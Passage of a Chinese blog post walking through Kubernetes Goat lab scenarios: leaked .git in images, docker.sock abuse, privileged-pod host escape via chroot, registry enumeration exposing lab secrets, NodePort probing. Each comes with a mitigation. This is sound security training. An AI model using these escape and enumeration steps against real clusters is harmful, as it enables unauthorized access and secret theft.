---
date: "2022-08-14"
slug: "/2022-08-14-kubernetes-goat"
layout: post
title: "kubernetes-goat"
tags: ["kubernete", "security"]
---
<!-- vim-markdown-toc GitLab -->

* [前言](#前言)
* [本地安装](#本地安装)
* [线上环境](#线上环境)
* [场景](#场景)
    * [Sensitive keys in codebases](#sensitive-keys-in-codebases)
        * [Problem](#problem)
        * [Solution](#solution)
    * [DIND (docker-in-docker) exploitation](#dind-docker-in-docker-exploitation)
        * [Problem](#problem-1)
        * [Solution](#solution-1)
    * [SSRF in the Kubernetes (K8S) world](#ssrf-in-the-kubernetes-k8s-world)
        * [Problem](#problem-2)
    * [Container escape to the host system](#container-escape-to-the-host-system)
        * [Problem](#problem-3)
    * [Solution](#solution-2)
    * [Docker CIS benchmarks analysis](#docker-cis-benchmarks-analysis)
        * [Problem](#problem-4)
    * [Kubernetes CIS benchmarks analysis](#kubernetes-cis-benchmarks-analysis)
        * [Problem](#problem-5)
            * [master-job.yaml](#master-jobyaml)
            * [node-job.yaml](#node-jobyaml)
    * [Attacking private registry](#attacking-private-registry)
        * [Problem](#problem-6)
        * [Solution](#solution-3)
    * [NodePort exposed services](#nodeport-exposed-services)
        * [Problem](#problem-7)
        * [Solution](#solution-4)
    * [Analysing crypto miner container](#analysing-crypto-miner-container)
        * [Problem](#problem-8)
        * [Solution](#solution-5)
    * [Kubernetes namespaces bypass](#kubernetes-namespaces-bypass)
        * [Problem](#problem-9)
        * [Solution](#solution-6)
    * [Gaining environment information](#gaining-environment-information)
        * [Problem](#problem-10)
    * [DoS the Memory/CPU resources](#dos-the-memorycpu-resources)
        * [Problem](#problem-11)
    * [Hacker container preview](#hacker-container-preview)
        * [Problem](#problem-12)
    * [Hidden in layers](#hidden-in-layers)
        * [Problem](#problem-13)
        * [Solution](#solution-7)
    * [RBAC least privileges misconfiguration](#rbac-least-privileges-misconfiguration)
        * [Problem](#problem-14)
        * [Solution](#solution-8)
    * [KubeAudit - Audit Kubernetes clusters](#kubeaudit-audit-kubernetes-clusters)
    * [Falco - Runtime security monitoring & detection](#falco-runtime-security-monitoring-detection)
    * [Popeye - A Kubernetes cluster sanitizer](#popeye-a-kubernetes-cluster-sanitizer)
    * [Secure network boundaries using NSP](#secure-network-boundaries-using-nsp)
        * [Problem](#problem-15)
* [summary](#summary)
* [Reference](#reference)

<!-- vim-markdown-toc -->

# 前言

Kubernetes Goat 是一个交互式的 Kubernetes 安全学习场所，这里简单梳理下它提供的一些场景

# 本地安装

```bash
git clone https://github.com/madhuakula/kubernetes-goat.git

cd kubernetes-goat

bash setup-kubernetes-goat.sh

bash access-kubernetes-goat.sh
```

其中`setup-kubernetes-goat.sh`，启动了下面场景需要的 deployment，包括创建了 superadmin 的 `serviceaccount`
`access-kubernetes-goat.sh`，就是把每个场景的 deployment 都进行`port-forward`

# 线上环境

**推荐**使用 kata 提供的[线上环境](https://katacoda.com/madhuakula/scenarios/kubernetes-goat)

# 场景

每个场景都有一个全局展示图，有助于理解

## Sensitive keys in codebases

![scenario-1](https://madhuakula.com/kubernetes-goat/assets/images/scenario-1-a9eae5ef2d147efb1ddd430132ef3498.png)

### Problem

从上图看，可以看到 ocker 镜像中，把.git 的文件夹包含进去了。导致其他人可以看到提交信息、提交的内容等。
通过[git-dumper](https://github.com/arthaud/git-dumper)，指定.git，把代码下载到本地

### Solution

1. docker multi-build，只把打包后产物放到 docker 中
2. 通过[TruffleHog](https://github.com/trufflesecurity/trufflehog)检查 git 提交/历史记录中泄漏的凭据

## DIND (docker-in-docker) exploitation

![dind](https://madhuakula.com/kubernetes-goat/assets/images/scenario-2-29ce411f882ff11438dfdd96b7fa45fd.png)

### Problem

虽然提供的是一个可以输入命令行的窗口，实际的环境是在 CI 过程，通过`uname -a`获取到操作系统，`wget` 下载 和 tar 解压，然后使用`docker -H`指定宿主机的 docker.sock，最终获取到 docker 的权限

### Solution

[Protect the Docker daemon socket](https://docs.docker.com/engine/security/protect-access/)

## SSRF in the Kubernetes (K8S) world

![SSRF](https://madhuakula.com/kubernetes-goat/assets/images/scenario-3-9d249af6ea439565f61ff69fffb033ee.png)

SSRF(Server Side Request Forgery)：服务端请求伪造

服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF 攻击通常针对外部网络无法直接访问的内部系统。

### Problem

内部有个 api proxy，通过 service 访问到了 http://metadata-db/latest/secrets/kubernetes-goat，secret 里的数据，然后通过 base64 decode 解谜拿到了数据

通过 deployment.yaml 发现，启动了两个 container 和两个 service，其中一个 service 的 type 是 NodePort

## Container escape to the host system

![escape](https://madhuakula.com/kubernetes-goat/assets/images/scenario-4-8365f1150e410a08e1ed2e204267dbc9.png)

### Problem

容器配置了一些 privileges，然后通过通过`chroot /host-system bash`提权，可以使用宿主机的 docker 和 kubeconfig，进行破坏

摘取了一小段 yaml，把宿主机的根目录挂载进去了。

通过 hostPID、hostIPC、hostNetwork 共享宿主机的 PID、IPC 、Network 的 namespaces

securityContext.privileges 为 true，可以访问宿主机上的设备，和运行在宿主机上的进程能力相似
allowPrivilegeEscalation 为 true，可以升级特权到 root 权限

secret goatvault 里的内容 base64 解谜后是 k8s-goat-cd2da27224591da2b48ef83826a8a6c3

```yaml
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  volumes:
    - name: host-filesystem
      hostPath:
        path: /
  containers:
    - name: system-monitor
        ......
      securityContext:
        allowPrivilegeEscalation: true
        privileged: true
      volumeMounts:
        - name: host-filesystem
          mountPath: /host-system
      env:
        - name: K8S_GOAT_VAULT_KEY
          valueFrom:
            secretKeyRef:
              name: goatvault
              key: k8sgoatvaultkey
```

## Solution

1. 使用 rootless 的权限运行

## Docker CIS benchmarks analysis

![CIS](https://madhuakula.com/kubernetes-goat/assets/images/scenario-5-bdef8a5cad9f733a492c4ad24c2f42f4.png)
CIS(Center for Internet Security)制定了 Docker CIS 的[标准](https://paper.bobylive.com/Security/CIS/CIS_Docker_Community_Edition_Benchmark_v1_1_0.pdf)，章节内容和上图右下角的 9 条一致。

### Problem

以 DaemonSet 的方式运行在每一台 node 上，并且赋予 AUDIT_CONTROL 的 capabilities，`Write records to kernel auditing log`，然后执行[
docker-bench-security
](https://github.com/docker/docker-bench-security)的 docker-bench-security.sh 进行检测

## Kubernetes CIS benchmarks analysis

![kubernetes CIS](https://madhuakula.com/kubernetes-goat/assets/images/scenario-6-78049d3b97fcd61c8101b10ea4bd0e8b.png)

### Problem

分别使用 k8s job，对 K8S，进行 CSI 检测，分别对 master 和 node 进行测试。

#### master-job.yaml

将/var/lib/etcd，/etc/kubernetes，/usr/bin 的文件挂在到容器中，运行`kube-bench master`，image 是由[这个仓库](https://github.com/aquasecurity/kube-bench)打包出来的。

/var/lib/etcd 下放了 etcd 的 snap 和 wal 数据，

/etc/kubernetes 下放了 k8s 各种配置文件，如 cni，coredns，scheduler 的配置

还容忍了"node-role.kubernetes.io/master: NoSchedule"的污点

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: kube-bench-master
spec:
  template:
    spec:
      hostPID: true
      nodeSelector:
        node-role.kubernetes.io/master: ""
      tolerations:
        - key: node-role.kubernetes.io/master
          operator: Exists
          effect: NoSchedule
      containers:
        - name: kube-bench
          image: aquasec/kube-bench:latest
          command: ["kube-bench", "master"]
          volumeMounts:
            - name: var-lib-etcd
              mountPath: /var/lib/etcd
              readOnly: true
            - name: etc-kubernetes
              mountPath: /etc/kubernetes
              readOnly: true
              # /usr/local/mount-from-host/bin is mounted to access kubectl / kubelet, for auto-detecting the Kubernetes version.
              # You can omit this mount if you specify --version as part of the command.
            - name: usr-bin
              mountPath: /usr/local/mount-from-host/bin
              readOnly: true
      restartPolicy: Never
      volumes:
        - name: var-lib-etcd
          hostPath:
            path: "/var/lib/etcd"
        - name: etc-kubernetes
          hostPath:
            path: "/etc/kubernetes"
        - name: usr-bin
          hostPath:
            path: "/usr/bin"
```

#### node-job.yaml

将/var/lib/kubelet，/etc/systemd，/usr/bin 的文件挂在到容器中，运行`kube-bench node`

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: kube-bench-node
spec:
  template:
    spec:
      hostPID: true
      containers:
        - name: kube-bench
          image: aquasec/kube-bench:latest
          # command: ["kube-bench", "--benchmark", "gke-1.0", "run", "--targets", "node,policies,managedservices"]
          command: ["kube-bench", "node"]
          volumeMounts:
            - name: var-lib-kubelet
              mountPath: /var/lib/kubelet
              readOnly: true
            - name: etc-systemd
              mountPath: /etc/systemd
              readOnly: true
            - name: etc-kubernetes
              mountPath: /etc/kubernetes
              readOnly: true
              # /usr/local/mount-from-host/bin is mounted to access kubectl / kubelet, for auto-detecting the Kubernetes version.
              # You can omit this mount if you specify --version as part of the command.
            - name: usr-bin
              mountPath: /usr/local/mount-from-host/bin
              readOnly: true
      restartPolicy: Never
      volumes:
        - name: var-lib-kubelet
          hostPath:
            path: "/var/lib/kubelet"
        - name: etc-systemd
          hostPath:
            path: "/etc/systemd"
        - name: etc-kubernetes
          hostPath:
            path: "/etc/kubernetes"
        - name: usr-bin
          hostPath:
            path: "/usr/bin"
```

## Attacking private registry

![registry](https://madhuakula.com/kubernetes-goat/assets/images/scenario-7-fbcf2b81257e7185ddfa569b9089e34d.png)

### Problem

获取到镜像中的敏感数据，
场景中提到的三个命令

[GET /v2/](https://docs.docker.com/registry/spec/api/#api-version-check) 是 最小的 endpoint，用来提供版本支持，

```
http http://127.0.0.1:1235/v2/
HTTP/1.1 200 OK
Content-Length: 2
Content-Type: application/json; charset=utf-8
Date: Tue, 09 Aug 2022 12:52:47 GMT
Docker-Distribution-Api-Version: registry/2.0
X-Content-Type-Options: nosniff
{}
```

[GET /v2/\_catalog](https://docs.docker.com/registry/spec/api/#listing-repositories) 是用来列出所有的 repository，

```
http http://127.0.0.1:1235/v2/_catalog
HTTP/1.1 200 OK
Content-Length: 81
Content-Type: application/json; charset=utf-8
Date: Tue, 09 Aug 2022 12:52:09 GMT
Docker-Distribution-Api-Version: registry/2.0
X-Content-Type-Options: nosniff

{
    "repositories": [
        "madhuakula/k8s-goat-alpine",
        "madhuakula/k8s-goat-users-repo"
    ]
}
```

[GET /v2/<name>/manifests/<reference>](https://docs.docker.com/registry/spec/api/#manifest) 是用来获取 manifest

```
http http://127.0.0.1:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest

HTTP/1.1 200 OK
Content-Length: 14728
Content-Type: application/vnd.docker.distribution.manifest.v1+prettyjws
Date: Tue, 09 Aug 2022 12:54:08 GMT
Docker-Content-Digest: sha256:f993c17115d3fd3ee6ca95086b0fafe69abf637145a7d11bbfd1663ebcba9ff6
Docker-Distribution-Api-Version: registry/2.0
Etag: "sha256:f993c17115d3fd3ee6ca95086b0fafe69abf637145a7d11bbfd1663ebcba9ff6"
X-Content-Type-Options: nosniff

{
   "schemaVersion": 1,
   "name": "madhuakula/k8s-goat-users-repo",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:536ef5475913f0235984eb7642226a99ff4a91fa474317faa45753e48e631bd0"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:0f8a54c5d7c710ded3c3fa9ff71e9885003d375d62545f5e767352fc818b3bd6"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:81b7f5a7444b8cb64dff0006b57bc7c5eb6249e6a7698017bb5a790caf069ce7"
      },
      {
         "blobSum": "sha256:7031d6d6c7f13f9b47350f2e479949982cb576e2a0053d7578fcfe386e8b1f17"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:36b3adc4ff6ffb76ae233f0a92177205845aaf3e9a39e0f96405dabd1423edc9"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:df20fa9351a15782c64e6dddb2d4a6f50bf6d3688060a34c4014b0d9a752eb4c"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"LANG=C.UTF-8\",\"GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568\",\"PYTHON_VERSION=3.8.3\",\"PYTHON_PIP_VERSION=20.1.1\",\"PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/eff16c878c7fd6b688b9b4c4267695cf1a0bf01b/get-pip.py\",\"PYTHON_GET_PIP_SHA256=b3153ec0cf7b7bbf9556932aa37e4981c35dc2a2c501d70d91d2795aa532be79\",\"API_KEY=k8s-goat-cf658c56a501385205cc6d2dafee8fc1\"],\"Cmd\":[\"python\",\"/app.py\"],\"Image\":\"sha256:e153d4fb27e4cd171cdaedcb2a1e613e632706397bf5cc869cffc4059b32bf43\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{\"INFO\":\"Kubernetes Goat\",\"MAINTAINER\":\"Madhu Akula\"}},\"container\":\"d2e94d9b94a36aecacb07de3395e95960c050c076aa162bd0b1bb80d5481a493\",\"container_config\":{\"Hostname\":\"d2e94d9b94a3\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"LANG=C.UTF-8\",\"GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568\",\"PYTHON_VERSION=3.8.3\",\"PYTHON_PIP_VERSION=20.1.1\",\"PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/eff16c878c7fd6b688b9b4c4267695cf1a0bf01b/get-pip.py\",\"PYTHON_GET_PIP_SHA256=b3153ec0cf7b7bbf9556932aa37e4981c35dc2a2c501d70d91d2795aa532be79\",\"API_KEY=k8s-goat-cf658c56a501385205cc6d2dafee8fc1\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"python\\\" \\\"/app.py\\\"]\"],\"Image\":\"sha256:e153d4fb27e4cd171cdaedcb2a1e613e632706397bf5cc869cffc4059b32bf43\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{\"INFO\":\"Kubernetes Goat\",\"MAINTAINER\":\"Madhu Akula\"}},\"created\":\"2020-06-13T20:16:46.902378866Z\",\"docker_version\":\"19.03.8\",\"id\":\"e9ada9f9e7f8da4fcfa730845b0051ef082f6857f22beaf86a935a65f7885d33\",\"os\":\"linux\",\"parent\":\"7ded59dd4c1c430e4e10fbc45aa5b1f3e6cb4c1990fb9d46e9e08a8ed752c64a\",\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7ded59dd4c1c430e4e10fbc45aa5b1f3e6cb4c1990fb9d46e9e08a8ed752c64a\",\"parent\":\"b982c822c063b9e0509aa0a9744919fe6fb5c7ad5f53a88e048425fcc60415ca\",\"created\":\"2020-06-13T20:16:46.796444362Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:a109d84041ae62b3f721067aff3fdc1c912bc941b117d50626c46090cc9450c7 in /app.py \"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"b982c822c063b9e0509aa0a9744919fe6fb5c7ad5f53a88e048425fcc60415ca\",\"parent\":\"cc82f5244e626b95c07c021ffe8027b073b08857944a1fbb9c5041b3623e0485\",\"created\":\"2020-06-13T20:16:46.673369545Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV API_KEY=k8s-goat-cf658c56a501385205cc6d2dafee8fc1\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"cc82f5244e626b95c07c021ffe8027b073b08857944a1fbb9c5041b3623e0485\",\"parent\":\"8366b315dc73bb82c6d4d55695e55f4a6b757d8817d9efa1ae949598c336b615\",\"created\":\"2020-06-13T20:16:46.56391658Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"8366b315dc73bb82c6d4d55695e55f4a6b757d8817d9efa1ae949598c336b615\",\"parent\":\"7ef59c0fd74b25404223efdb0d6fa08c6fb498cdac05c549029c38a6cf477297\",\"created\":\"2020-06-03T19:50:59.091602744Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"python3\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7ef59c0fd74b25404223efdb0d6fa08c6fb498cdac05c549029c38a6cf477297\",\"parent\":\"157295f35c39ef1d533b7b3a51ad1cc4552ce5cd9e025a43c10e117a6e8380a8\",\"created\":\"2020-06-03T19:50:58.878807294Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -ex; \\t\\twget -O get-pip.py \\\"$PYTHON_GET_PIP_URL\\\"; \\techo \\\"$PYTHON_GET_PIP_SHA256 *get-pip.py\\\" | sha256sum -c -; \\t\\tpython get-pip.py \\t\\t--disable-pip-version-check \\t\\t--no-cache-dir \\t\\t\\\"pip==$PYTHON_PIP_VERSION\\\" \\t; \\tpip --version; \\t\\tfind /usr/local -depth \\t\\t\\\\( \\t\\t\\t\\\\( -type d -a \\\\( -name test -o -name tests -o -name idle_test \\\\) \\\\) \\t\\t\\t-o \\t\\t\\t\\\\( -type f -a \\\\( -name '*.pyc' -o -name '*.pyo' \\\\) \\\\) \\t\\t\\\\) -exec rm -rf '{}' +; \\trm -f get-pip.py\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"157295f35c39ef1d533b7b3a51ad1cc4552ce5cd9e025a43c10e117a6e8380a8\",\"parent\":\"dd65bb40873b452ee88ec8d4f4482e9f5a5842ae8aaac409d65a5bcedce78859\",\"created\":\"2020-06-03T19:50:52.919644515Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PYTHON_GET_PIP_SHA256=b3153ec0cf7b7bbf9556932aa37e4981c35dc2a2c501d70d91d2795aa532be79\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"dd65bb40873b452ee88ec8d4f4482e9f5a5842ae8aaac409d65a5bcedce78859\",\"parent\":\"171af41a4d6347e707cfa3c480ac5178bdc67990d0caa044dd66d11869da48ba\",\"created\":\"2020-06-03T19:50:52.72304401Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/eff16c878c7fd6b688b9b4c4267695cf1a0bf01b/get-pip.py\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"171af41a4d6347e707cfa3c480ac5178bdc67990d0caa044dd66d11869da48ba\",\"parent\":\"be9586972ba128057f8e8b80bebf4ef594355901364d9d388451014847e7104b\",\"created\":\"2020-06-03T19:50:52.536709394Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PYTHON_PIP_VERSION=20.1.1\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"be9586972ba128057f8e8b80bebf4ef594355901364d9d388451014847e7104b\",\"parent\":\"bb902bce6f667685c7cde8bf4a9f128b8d585dfec4c8282d500fc331ebc8225f\",\"created\":\"2020-06-03T19:50:52.324615042Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c cd /usr/local/bin \\t\\u0026\\u0026 ln -s idle3 idle \\t\\u0026\\u0026 ln -s pydoc3 pydoc \\t\\u0026\\u0026 ln -s python3 python \\t\\u0026\\u0026 ln -s python3-config python-config\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"bb902bce6f667685c7cde8bf4a9f128b8d585dfec4c8282d500fc331ebc8225f\",\"parent\":\"e8f9f7b0c4cab8c22f312bed4dc62a93679371f6b776d011b2e5a6c56d697fd5\",\"created\":\"2020-06-03T19:50:51.475699206Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -ex \\t\\u0026\\u0026 apk add --no-cache --virtual .fetch-deps \\t\\tgnupg \\t\\ttar \\t\\txz \\t\\t\\u0026\\u0026 wget -O python.tar.xz \\\"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz\\\" \\t\\u0026\\u0026 wget -O python.tar.xz.asc \\\"https://www.python.org/ftp/python/${PYTHON_VERSION%%[a-z]*}/Python-$PYTHON_VERSION.tar.xz.asc\\\" \\t\\u0026\\u0026 export GNUPGHOME=\\\"$(mktemp -d)\\\" \\t\\u0026\\u0026 gpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys \\\"$GPG_KEY\\\" \\t\\u0026\\u0026 gpg --batch --verify python.tar.xz.asc python.tar.xz \\t\\u0026\\u0026 { command -v gpgconf \\u003e /dev/null \\u0026\\u0026 gpgconf --kill all || :; } \\t\\u0026\\u0026 rm -rf \\\"$GNUPGHOME\\\" python.tar.xz.asc \\t\\u0026\\u0026 mkdir -p /usr/src/python \\t\\u0026\\u0026 tar -xJC /usr/src/python --strip-components=1 -f python.tar.xz \\t\\u0026\\u0026 rm python.tar.xz \\t\\t\\u0026\\u0026 apk add --no-cache --virtual .build-deps  \\t\\tbluez-dev \\t\\tbzip2-dev \\t\\tcoreutils \\t\\tdpkg-dev dpkg \\t\\texpat-dev \\t\\tfindutils \\t\\tgcc \\t\\tgdbm-dev \\t\\tlibc-dev \\t\\tlibffi-dev \\t\\tlibnsl-dev \\t\\tlibtirpc-dev \\t\\tlinux-headers \\t\\tmake \\t\\tncurses-dev \\t\\topenssl-dev \\t\\tpax-utils \\t\\treadline-dev \\t\\tsqlite-dev \\t\\ttcl-dev \\t\\ttk \\t\\ttk-dev \\t\\tutil-linux-dev \\t\\txz-dev \\t\\tzlib-dev \\t\\u0026\\u0026 apk del --no-network .fetch-deps \\t\\t\\u0026\\u0026 cd /usr/src/python \\t\\u0026\\u0026 gnuArch=\\\"$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)\\\" \\t\\u0026\\u0026 ./configure \\t\\t--build=\\\"$gnuArch\\\" \\t\\t--enable-loadable-sqlite-extensions \\t\\t--enable-optimizations \\t\\t--enable-option-checking=fatal \\t\\t--enable-shared \\t\\t--with-system-expat \\t\\t--with-system-ffi \\t\\t--without-ensurepip \\t\\u0026\\u0026 make -j \\\"$(nproc)\\\" \\t\\tEXTRA_CFLAGS=\\\"-DTHREAD_STACK_SIZE=0x100000\\\" \\t\\tLDFLAGS=\\\"-Wl,--strip-all\\\" \\t\\u0026\\u0026 make install \\t\\t\\u0026\\u0026 find /usr/local -type f -executable -not \\\\( -name '*tkinter*' \\\\) -exec scanelf --needed --nobanner --format '%n#p' '{}' ';' \\t\\t| tr ',' '\\\\n' \\t\\t| sort -u \\t\\t| awk 'system(\\\"[ -e /usr/local/lib/\\\" $1 \\\" ]\\\") == 0 { next } { print \\\"so:\\\" $1 }' \\t\\t| xargs -rt apk add --no-cache --virtual .python-rundeps \\t\\u0026\\u0026 apk del --no-network .build-deps \\t\\t\\u0026\\u0026 find /usr/local -depth \\t\\t\\\\( \\t\\t\\t\\\\( -type d -a \\\\( -name test -o -name tests -o -name idle_test \\\\) \\\\) \\t\\t\\t-o \\t\\t\\t\\\\( -type f -a \\\\( -name '*.pyc' -o -name '*.pyo' \\\\) \\\\) \\t\\t\\\\) -exec rm -rf '{}' + \\t\\u0026\\u0026 rm -rf /usr/src/python \\t\\t\\u0026\\u0026 python3 --version\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"e8f9f7b0c4cab8c22f312bed4dc62a93679371f6b776d011b2e5a6c56d697fd5\",\"parent\":\"9bc24c2e206a4134e65e622ff4ba03cd87b1c0bb34fd1cd35bb3e9a9564901d7\",\"created\":\"2020-06-03T19:44:10.475750581Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PYTHON_VERSION=3.8.3\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"9bc24c2e206a4134e65e622ff4ba03cd87b1c0bb34fd1cd35bb3e9a9564901d7\",\"parent\":\"ff9856bbec59f5d1b0494a6e2e40b246a8c9596447f637ee4b1032edd407a7a1\",\"created\":\"2020-06-03T19:36:54.463195841Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"ff9856bbec59f5d1b0494a6e2e40b246a8c9596447f637ee4b1032edd407a7a1\",\"parent\":\"d787f9af08e59e8d69bf1993946d99d2838618348d1ab0265090399016a3cdc9\",\"created\":\"2020-06-03T19:36:54.263878304Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c apk add --no-cache ca-certificates\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"d787f9af08e59e8d69bf1993946d99d2838618348d1ab0265090399016a3cdc9\",\"parent\":\"74298a5da7fcb86414aeb5b4df34ffcac2de2a05ddcc37b23a2f9efca07c449e\",\"created\":\"2020-06-03T19:36:53.13683627Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LANG=C.UTF-8\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"74298a5da7fcb86414aeb5b4df34ffcac2de2a05ddcc37b23a2f9efca07c449e\",\"parent\":\"7d8162e3a9816c038aad353ed0c72296d300e9e4273c639d6e52400613d6c94b\",\"created\":\"2020-06-02T01:48:49.301095388Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"7d8162e3a9816c038aad353ed0c72296d300e9e4273c639d6e52400613d6c94b\",\"parent\":\"a5213fa3ad8fa7a42f88213945845ef49dcf11328d51576b8f076142ce75bdf8\",\"created\":\"2020-05-29T21:19:46.363518345Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"a5213fa3ad8fa7a42f88213945845ef49dcf11328d51576b8f076142ce75bdf8\",\"created\":\"2020-05-29T21:19:46.192045972Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:c92c248239f8c7b9b3c067650954815f391b7bcb09023f984972c082ace2a8d0 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "DNXE:FXM4:GYNR:LWH3:DW25:3TLK:MWJO:ZKC6:FIOH:U2EQ:LFIG:YSO5",
               "kty": "EC",
               "x": "5T7-A1Px99bbjzgseO3_Sno_q1i0rwkloFNExwU-Djk",
               "y": "JAoVE_5i-JASgeVDLw0A2GiQBRtXIkNzp7s26kaIg58"
            },
            "alg": "ES256"
         },
         "signature": "XCSpw1kC6JVMnlIUtFo0M2YmsTCaBlk-fisL0bNy63xtzIechiQZ08Duj13NSIJHYemeCcfgVbcYyOFi1JE6ow",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjE0MDgwLCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjItMDgtMDlUMTI6NTQ6MDhaIn0"
      }
   ]
}

```

### Solution

不要在 Dockerfile 里添加 API_KEY、SECRET 等敏感信息，尽量在 Deployment 中添加。

## NodePort exposed services

![NodePort exposed services](https://madhuakula.com/kubernetes-goat/assets/images/scenario-8-ffadb402f58fbe7a3d4845cef3ce9609.png)

### Problem

NodePort 的 service，端口范围是 30000-32767，
然后通过`nc -zv EXTERNAL-IP-ADDRESS 30003` 访问到

### Solution

在生产环境不要使用 NodePort 的 service

## Analysing crypto miner container

### Problem

提供一个 job

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: batch-check-job
spec:
  template:
    metadata:
      name: batch-check-job
